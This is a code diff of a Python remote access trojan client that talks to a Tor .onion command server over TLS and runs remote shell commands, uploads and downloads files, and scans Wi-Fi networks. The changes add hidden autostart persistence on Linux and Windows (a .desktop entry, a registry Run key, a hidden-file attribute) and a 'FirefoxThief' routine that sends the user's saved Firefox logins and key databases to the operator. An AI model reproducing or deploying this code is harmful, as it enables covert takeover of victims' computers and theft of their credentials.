@@ -1,4 +1,4 @@
-import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, urllib2, os.path, base64
+import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, inspect,urllib2, os.path, base64, getpass, zipfile
 from colored import fg, bg, attr
 from subprocess import Popen, PIPE, STDOUT
 from wifi import Cell, Scheme
@@ -28,8 +28,8 @@ class PKCS7Encoder():
         return text[:-pad]
 
 encoder = PKCS7Encoder()
-host = 'hcjczulezpxxfw2n.onion'
-#host = '127.0.0.1'
+#host = 'hcjczulezpxxfw2n.onion'
+host = '127.0.0.1'
 cType = "client000-crypto"
 
 # sysinfo
@@ -43,12 +43,43 @@ def RecvData():
     temp = ssl_sock.read()
     return temp
 
+# autostart for Linux
+def LinuxAutoStart():
+    home = os.environ["HOME"]
+    name = "." + inspect.getfile(inspect.currentframe());
+    launcher = ["[Desktop Entry]", "Name=", "Type=Application", "NoDisplay=true","X-GNOME-Autostart-enabled=true"]
+    dr = home+"/.config/autostart/"
+    if not os.path.exists(dr):
+        os.makedirs(dr)
+    file = dr+name.lower()+".desktop"
+    if not os.path.exists(file):
+        with open(file, "wt") as out:
+            for l in launcher:
+                l = l+name if l == "Name=" else l
+                out.write(l+"\n")
+    #EXEC("chattr +i "+file) you're not r00t
+        status = "ok"
+    else:
+        status = "error"
+    return status
+
+# autostart for Windows
+def WindowsAutoStart():
+    try:
+        name = inspect.getfile(inspect.currentframe());
+        EXEC("REG ADD \"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" /V \"My App\" /t REG_SZ /F /D \"C:\MyAppPath\""+name)
+        EXEC("attrib +h" + name)
+        status = "ok"
+    except:
+        status = "error"
+    return status
+
 def ScanWIFI(card):
     try:
         wifiCell = Cell.all(card)
     except:
-        wifiCell = Cell.all('wlp8s0')
-        SendData("Something went wrong... using wlp8s0")
+        wifiCell = Cell.all('wlan0')
+        SendData("Something went wrong... using wlan0")
     for i in range(0,len(wifiCell)):
         SendData(str(wifiCell[i]) + " is encrypted: "+ str(wifiCell[i].encrypted) + "= " + str(wifiCell[i].encryption_type) + " | address: " +str(wifiCell[i].address))
     SendData("ScanWIFI-finished")
@@ -56,6 +87,19 @@ def ScanWIFI(card):
 def RecvData():
     temp = ssl_sock.read()
     return temp
+
+def FirefoxThief():
+    if platform.system() == "Linux":
+        if os.path.isdir("/home/"+getpass.getuser()+"/.mozilla/firefox/") == True:
+            os.chdir("/home/"+getpass.getuser()+"/.mozilla/firefox/")
+            SendData(EXEC("ls -la"))
+            newDir = RecvData()
+            UploadFILE("profiles.ini")
+            os.chdir("/home/"+getpass.getuser()+"/.mozilla/firefox/"+newDir)
+            UploadFILE("cert8.db")
+            UploadFILE("key3.db")
+            UploadFILE("logins.json")
+
 
 def DKey(primitiveKey, salt):
     dk = hashlib.pbkdf2_hmac('sha256', primitiveKey, salt, 500000)
@@ -158,9 +202,41 @@ def DownloadFILE(fileName):
     fileDOWN.close()
     SendData("CDF")
 
+certificate = """-----BEGIN CERTIFICATE-----\n
+MIICaDCCAdGgAwIBAgIJAJmzO+Nz8Q9SMA0GCSqGSIb3DQEBCwUAME0xCzAJBgNV
+BAYTAkRXMQ8wDQYDVQQIDAZUb3JOZXQxDDAKBgNVBAoMA1QyQjEfMB0GA1UEAwwW
+aGNqY3p1bGV6cHh4Zncybi5vbmlvbjAeFw0xNjA1MTYxNzI5NThaFw0yNjA1MTQx
+NzI5NThaME0xCzAJBgNVBAYTAkRXMQ8wDQYDVQQIDAZUb3JOZXQxDDAKBgNVBAoM
+A1QyQjEfMB0GA1UEAwwWaGNqY3p1bGV6cHh4Zncybi5vbmlvbjCBnzANBgkqhkiG
+9w0BAQEFAAOBjQAwgYkCgYEA0DzzRuOWrxCGNG7vF9VxghbS5vHpSBNs5o2Mtar7
+iVZFdqO1Yc3YHQ8XqIWytlqYo/ViKEgo0o+GtZxSBXpnpfruYtS9df3xzxBXkKo4
+8S6ruPC9/aI8QdUslytKcvHRfQqAKLFiuuukgPXHUNNqizaSsebRWQpZmkWg0D6o
+5nMCAwEAAaNQME4wHQYDVR0OBBYEFMwvDGhcC3+uNxD31WsdwPF4t5bnMB8GA1Ud
+IwQYMBaAFMwvDGhcC3+uNxD31WsdwPF4t5bnMAwGA1UdEwQFMAMBAf8wDQYJKoZI
+hvcNAQELBQADgYEAYJLaW4lXmmKH0yyFnCqbTaaJrTTuDnnH60eKyhk95VG7Jmx4
+6rKKlT/6QlZ3/CKhQI4agg67sjWEIj77bF1c4mlZDfgSRPxeOqf/EKFx/ACgAg/7
+SpzSIqUA7b1hFHax969cOEq/39p9Y9XEdYhO7FhWmR4XioaduKmlQRNa6y8=
+-----END CERTIFICATE-----"""
+
+CH = hashlib.sha256()
+CH.update(certificate)
+certificateHASH = CH.digest()
+
+if os.path.isfile("certificate.pem")==True:
+    with open("certificate.pem" , "rb") as inCert:
+        Cin = hashlib.sha256()
+        Cin.update(inCert.read())
+        CinH = Cin.digest()
+    if certificateHASH == CinH:
+        print("Cert ok")
+else:
+    with open("certificate.pem", "wa") as out:
+        out.write(certificate)
+        out.close()
+        print("Cert generated")
 
 sock = socks.socksocket()
-sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
+#sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
 sock.connect((host,5555))
 
 ssl_sock = ssl.wrap_socket(sock,
@@ -177,11 +253,22 @@ while 1:
     inText = RecvData()
     if inText.startswith("download"):
         UploadFILE(inText.split(" ")[1])
-        chunk = RecvData()
     elif inText == "info":
         SendData(str(uname))
         SendData('ip:'+myIP)
         SendData("end-info")
+    elif inText.startswith("set"):
+        if inText.split(":")[1]== "autostart":
+            if platform.system() == "Linux":
+                SendData("LinuxAutoStart: " +LinuxAutoStart())
+            elif platform.system() == "Windows":
+                SendData("WindowsAutoStart: "+WindowsAutoStart())
+            else: # at the moment os x not supported
+                SendData("No Windows/Linux system")
+                pass
+        else:
+            SendData("usage: set:autostart")
+            pass
     elif inText.startswith("upload"):
         DownloadFILE(inText.split(" ")[1])
     elif inText == "terminate":
@@ -208,6 +295,8 @@ while 1:
     elif inText.startswith("exec"):
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
+    elif inText == "FirefoxThief":
+        FirefoxThief()
     else:
         print '[inText] ' + inText
         ssl_sock.write(inText)
